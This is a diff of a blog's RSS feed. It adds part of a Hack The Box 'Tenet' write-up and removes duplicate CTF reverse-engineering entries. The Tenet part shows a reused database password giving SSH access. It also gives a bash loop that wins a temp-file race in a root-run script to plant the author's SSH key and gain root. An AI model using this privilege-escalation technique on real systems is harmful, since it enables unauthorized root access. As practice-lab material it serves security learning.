+&lt;p&gt;The CWD is wordpress home directory. Listing the files shows the &lt;code&gt;wp-config.php&lt;/code&gt;  file. Inside are credentials configured for interacting with the MySQL database. &lt;code&gt;neil:Opera2112&lt;/code&gt;. Neil used the same password for their login allowing SSH access directory to the box.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-wp-configphp.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-neilsudopermissions.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Via &lt;code&gt;sudo -l&lt;/code&gt; Niel&amp;rsquo;s sudo permissions can be checked. It turns it out they can run a script called&lt;code&gt;EnableSSH.sh&lt;/code&gt; with root permissions.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
+
+checkAdded&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+
+        sshName&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;/bin/echo $key | /usr/bin/cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; -f 3&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; ! -z &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;/bin/grep $sshName /root/.ssh/authorized_keys&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+
+                /bin/echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Successfully added &lt;/span&gt;$sshName&lt;span style=&#34;color:#e6db74&#34;&gt; to authorized_keys file!&amp;#34;&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+
+                /bin/echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error in adding &lt;/span&gt;$sshName&lt;span style=&#34;color:#e6db74&#34;&gt; to authorized_keys file!&amp;#34;&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+checkFile&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; ! -s $1 &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; ! -f $1 &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+
+                /bin/echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error in creating key file!&amp;#34;&lt;/span&gt;
+
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; -f $1 &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; /bin/rm $1; &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+                exit &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+addKey&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+
+        tmpName&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;mktemp -u /tmp/ssh-XXXXXXXX&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+
+        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;umask 110; touch $tmpName&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+
+        /bin/echo $key &amp;gt;&amp;gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &amp;gt;&amp;gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&amp;#34;&lt;/span&gt;
+addKey
+checkAdded
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The script is fairly simple in nature. First, it creates a temp file in &lt;code&gt;/tmp&lt;/code&gt; and then it echos the root public root SSH key. Then it adds that file to the &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; file and checks to make sure the key was added successfully.&lt;/p&gt;
+&lt;p&gt;This creates a race conidion. If that file is overwritten by a diffrent SSH key before it is added to &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;, it would grant SSH access as the root user.&lt;/p&gt;
+&lt;p&gt;A simple bash can be used to check to check if the temp file has been created. If it has, it will be overwritten with a key key of our choosing. Place all this in a while loop and start it running.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; true; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Checking for temp file...&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt; ls /tmp/ssh-* 2&amp;gt;/dev/null &lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+                echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6+U/U+EtFlAU/0QuXeMehQgipru8HqD+TOoGMoM8pON+Brgvr0ThHzSq14wSC6F8yZsHbHYgb7gVutcNsADD+mkl+aZn97385WgWxwYZdW6a8VRLCRFr9nLZhwGeBEJC33+GbKyn3P5flagzgdTlhSBeNxuIh1ahxhnunpEQO7x+J8vyP1ZzYbU2ukApurzkMbV3osD7ovKIKxHc9zbPLOT/907tpz0bT4K3PLsh2FTNjK7xhTNWbqO975+x0d/Ni3UIcmyEb6APTz2ipxqWELpw041Fj6uxzq9pRWLuMypV9vCP9smybu22yEClb4t4J3r63qFl+hpzEwcO8JS7gdhUI9oB7VxyrcjLM4/5MPCnW0faulAUnpspWMsaqun2OjJ1tQMtVJKT3WkUT/We6CPx6YigxnQgV6nUHW3qZ3ZCgvHRot8IRpCYA/fImMcWhuseX5dWGHOJtL641h43xI8AZPQylNkPepCzEa5vQ/b+tKaG7cWxjVD4jbgg4ZRk= root@ubuntu&amp;#34;&lt;/span&gt; &amp;gt; /tmp/ssh-*
+                echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;File found and overwritten&amp;#34;&lt;/span&gt;
+                exit
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;File not found. Continuing.&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;EnableSSH.sh&lt;/code&gt; can then be run from another session. The Overwrite script reports it found and overwrote a file and &lt;code&gt;EnableSSH.sh&lt;/code&gt; tells us the key was added successfully.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-fileoverwritten.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The private key matching the public key used in the script can then be used to SSH to Tenet with root permissions.&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap Up&lt;/h2&gt;
+&lt;p&gt;Thanks &lt;a href=&#34;https://app.hackthebox.eu/users/94858&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;egotisticalSW&lt;/a&gt;
+ for making this machine! I overall had a ton of fun. There was some difficulty on the root privesc. It took two days of attempting to finally get it working and switching to VIP+ servers. I think the challenge was I kept running into other people working on it at the same time and our scripts were clashing. I could see that getting very frustrating.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>HTB ScriptKiddie</title>
       <link>http://nightwolf56.github.io/htb-writeups/scriptkiddie-writeup/</link>
       <pubDate>Wed, 16 Jun 2021 00:00:00 -0600</pubDate>
@@ -797,62 +1219,6 @@ password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style
     &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
     s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s important to remember the server will only receive 32 bytes of data. Anything sent beyond that will be cut off and likely cause an error.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Cyber Apocalypse 2021: Passphrase</title>
-      <link>http://nightwolf56.github.io/ctf-writeups/ca-passphrase/</link>
-      <pubDate>Sun, 25 Apr 2021 00:00:00 -0100</pubDate>
-      
-      <guid>http://nightwolf56.github.io/ctf-writeups/ca-passphrase/</guid>
-      <description>&lt;p&gt;Passphrase is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file passphrase
-passphrase: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;60f6b6064d2e34a2b6a24dda9feb943b0b8c360f, not stripped
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings doens&amp;rsquo;t reveal a whole lot of info. The binary prompts for a &amp;ldquo;secret passphrase&amp;rdquo;. If it is correct, it asks that a message, presumably the flag, be taken to the chief.&lt;/p&gt;
-&lt;p&gt;Since the executable is not stripped when it is opened in Ghidra main() is clearly listed in the functions section of the symbol tree.&lt;/p&gt;
-&lt;p&gt;There a load of variables are initialized.&lt;/p&gt;
-&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-passphrase-vars.png&#34;
-        alt/&gt;&lt;/p&gt;
-&lt;p&gt;They are then set to various hex values while the prompt for a &amp;ldquo;secret passphrase&amp;rdquo; is output.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;collect input
-compare input with string of variable values
-
-if match{
-    Success
-}
-else{
-    Denied
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value user input is being compared to can be determined by converting the values of each variable to ASCII. Combine these values and we have retrieved the flag&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Cyber Apocalypse 2021: Passphrase</title>
-      <link>http://nightwolf56.github.io/posts/ca-passphrase/</link>
-      <pubDate>Sun, 25 Apr 2021 00:00:00 -0100</pubDate>
-      
-      <guid>http://nightwolf56.github.io/posts/ca-passphrase/</guid>
-      <description>&lt;p&gt;Passphrase is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file passphrase
-passphrase: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;60f6b6064d2e34a2b6a24dda9feb943b0b8c360f, not stripped
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings doens&amp;rsquo;t reveal a whole lot of info. The binary prompts for a &amp;ldquo;secret passphrase&amp;rdquo;. If it is correct, it asks that a message, presumably the flag, be taken to the chief.&lt;/p&gt;
-&lt;p&gt;Since the executable is not stripped when it is opened in Ghidra main() is clearly listed in the functions section of the symbol tree.&lt;/p&gt;
-&lt;p&gt;There a load of variables are initialized.&lt;/p&gt;
-&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-passphrase-vars.png&#34;
-        alt/&gt;&lt;/p&gt;
-&lt;p&gt;They are then set to various hex values while the prompt for a &amp;ldquo;secret passphrase&amp;rdquo; is output.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;collect input
-compare input with string of variable values
-
-if match{
-    Success
-}
-else{
-    Denied
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value user input is being compared to can be determined by converting the values of each variable to ASCII. Combine these values and we have retrieved the flag&lt;/p&gt;
 </description>
     </item>
     
